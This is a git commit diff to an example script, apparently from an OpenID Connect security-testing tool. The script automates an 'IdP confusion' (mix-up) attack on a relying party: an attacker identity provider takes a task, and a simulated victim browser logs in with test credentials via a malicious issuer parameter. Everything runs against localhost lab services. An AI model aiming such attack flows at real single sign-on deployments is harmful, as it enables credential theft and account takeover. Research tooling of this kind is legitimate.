1c160be6bcbf73b31b67c676f9122bb073e5b595
melonattacker <junkitombob@gmail.com>
2023-07-26 09:34:43 +0900

    UPDATE: idp_confusion

--- examples/rp/idp_confusion.py
+++ examples/rp/idp_confusion.py
@@ -8,36 +8,42 @@ from browser import BrowserSimulator
 from attacker_idp import AttackerIdPClient
 import id_token
 
-ATTACKER_IDP_ENDPOINT = "http://localhost:3000"
-ATTACKER_IDP_ENDPOINT_CONTAINER = "http://attacker-idp:3000"
-HONEST_IDP_ENDPOINT = "http://localhost:3001"
-HONEST_IDP_ENDPOINT_CONTAINER = "http://honest-idp:3001"
+ATTACKER_IDP_ENDPOINT = "http://localhost:9997"
+HONEST_IDP_ENDPOINT = "http://localhost:9998"
+HONEST_RP_ENDPOINT = "http://localhost:9999"
+PROXY_SERVER_ENDPOINT = "http://localhost:8080"
+
 attakcer_idp_client = AttackerIdPClient(ATTACKER_IDP_ENDPOINT)
 
 try:
     # add task to attacker idp
     name = 'IdPConfusion'
     args = {
-        'honest_idp_auth_endpoint': HONEST_IDP_ENDPOINT + '/auth'
+        'honest_idp_auth_endpoint': f'{HONEST_IDP_ENDPOINT}/auth'
     }
     task_id = attakcer_idp_client.add_task(name, args)
     print(task_id)
 
     time.sleep(5)
 
-    sso_flow = """page.locator('input[name="login"]').fill('hoge')
-page.locator('input[name="password"]').fill('huga')
-page.locator('button[type="submit"]').click()
+     # victim credentials
+    victim_username = 'test-user@localhost'
+    victim_password = 'verysecure'
+
+    # browser simulation
+    sso_flow = f"""
+page.locator('input[name="username"]').fill('{victim_username}')
+page.locator('input[name="password"]').fill('{victim_password}')
 page.locator('button[type="submit"]').click()
 print(page.content())
     """
     
     # fishing login
-    simulator = BrowserSimulator(f'http://localhost:5000/login?issuer={ATTACKER_IDP_ENDPOINT_CONTAINER}', 'http://localhost:8080')
+    simulator = BrowserSimulator(f'{HONEST_RP_ENDPOINT}/login?issuer={ATTACKER_IDP_ENDPOINT}/', PROXY_SERVER_ENDPOINT)
     simulator.run(sso_flow)
     simulator.close()
 
     attakcer_idp_client.delete_task()
 except Exception as e:
     print('Error:', e)
-    # attakcer_idp_client.delete_task()
+    attakcer_idp_client.delete_task()
